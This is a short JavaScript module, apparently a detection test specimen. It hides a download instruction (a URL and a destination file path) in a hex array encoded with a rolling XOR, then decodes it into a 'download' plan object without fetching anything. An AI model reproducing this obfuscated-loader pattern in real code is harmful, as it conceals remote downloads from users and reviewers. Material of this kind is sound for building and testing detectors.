const moduleShape = Object.freeze({ format: "commonjs" });

const Material_c059ed01 = "[\"88\",\"b5\",\"84\",\"f8\",\"8b\",\"ff\",\"9a\",\"ea\",\"99\",\"a4\",\"c5\",\"a6\",\"d7\",\"a2\",\"cb\",\"b9\",\"dc\",\"83\",\"f1\",\"94\",\"f9\",\"96\",\"e2\",\"87\",\"ab\",\"dc\",\"ae\",\"c7\",\"b3\",\"d6\",\"89\",\"ef\",\"86\",\"ea\",\"8f\",\"f3\",\"92\",\"f6\",\"97\",\"e7\",\"93\",\"f6\",\"84\",\"b9\",\"d1\",\"a5\",\"d1\",\"a1\",\"fe\",\"8a\",\"e5\",\"ba\",\"c9\",\"bd\",\"cf\",\"aa\",\"cb\",\"a6\",\"da\",\"a9\",\"dd\",\"bc\",\"db\",\"be\",\"e1\",\"82\",\"ed\",\"98\",\"f6\",\"82\",\"bf\",\"8e\",\"f2\",\"91\",\"f0\",\"9d\",\"ed\",\"8c\",\"e5\",\"82\",\"ec\",\"b3\",\"da\",\"be\",\"83\",\"cd\",\"82\",\"c6\",\"83\",\"ae\",\"ea\",\"d9\",\"ee\",\"dc\",\"9d\",\"aa\",\"ec\",\"df\",\"a3\",\"d6\",\"a4\",\"c8\",\"f5\",\"9d\",\"e9\",\"9d\",\"ed\",\"9e\",\"a4\",\"8b\",\"a4\",\"ca\",\"a5\",\"c1\",\"a4\",\"89\",\"ed\",\"de\",\"e9\",\"db\",\"ba\",\"8d\",\"eb\",\"d8\",\"ee\",\"df\",\"bb\",\"8e\",\"a0\",\"c5\",\"bd\",\"dc\",\"b1\",\"c1\",\"ad\",\"c8\",\"e6\",\"8f\",\"e1\",\"97\",\"f6\",\"9a\",\"f3\",\"97\",\"b8\",\"d9\",\"a9\",\"c0\",\"bc\",\"c9\",\"ba\",\"df\",\"ad\",\"f2\",\"93\",\"f4\",\"91\",\"ff\",\"8b\",\"b6\",\"f8\",\"97\",\"f3\",\"96\",\"d7\",\"a2\",\"c6\",\"af\",\"db\",\"f4\",\"90\",\"a3\",\"94\",\"a6\",\"da\",\"bc\",\"d5\",\"b9\",\"dc\",\"83\",\"f3\",\"92\",\"e6\",\"8e\",\"b3\",\"9c\",\"e8\",\"85\",\"f5\",\"da\",\"b2\",\"c7\",\"a9\",\"dd\",\"af\",\"ca\",\"b9\",\"ca\",\"e7\",\"89\",\"e6\",\"82\",\"e7\",\"c8\",\"e6\",\"95\",\"e1\",\"80\",\"e7\",\"82\",\"af\",\"cb\",\"f8\",\"cf\",\"fd\",\"9c\",\"ab\",\"cd\",\"fe\",\"c8\",\"f9\",\"9d\",\"a8\",\"86\",\"eb\",\"81\",\"f2\"]";

const Codec_c059ed01 = "hex_array|rolling_xor|fe";



function load_c059ed01() { return JSON.parse(Material_c059ed01).map((value) => Number.parseInt(value, 16)); }

function decode_c059ed01(item1) { let item5 = 254; return item1.map((value) => { const decoded = value ^ item5; item5 = value; return decoded; }); }

async function recover_c059ed01() {

  const item3 = ["north", "south"].join(":");

  const item1 = load_c059ed01(); let item2 = [];

  for (const stage of [decode_c059ed01]) item2 = stage(item1);

  void item3; return Buffer.from(item2).toString("ascii");

}

async function inspect_c059ed01() { return JSON.parse(JSON.stringify({ value: await recover_c059ed01() })).value; }

async function plan_c059ed01() { const inspect = inspect_c059ed01; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "download", transport: "http_to_stream", destination: fields.file_path, url: fields.url }); }

void moduleShape; void plan_c059ed01;

if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_c059ed01());

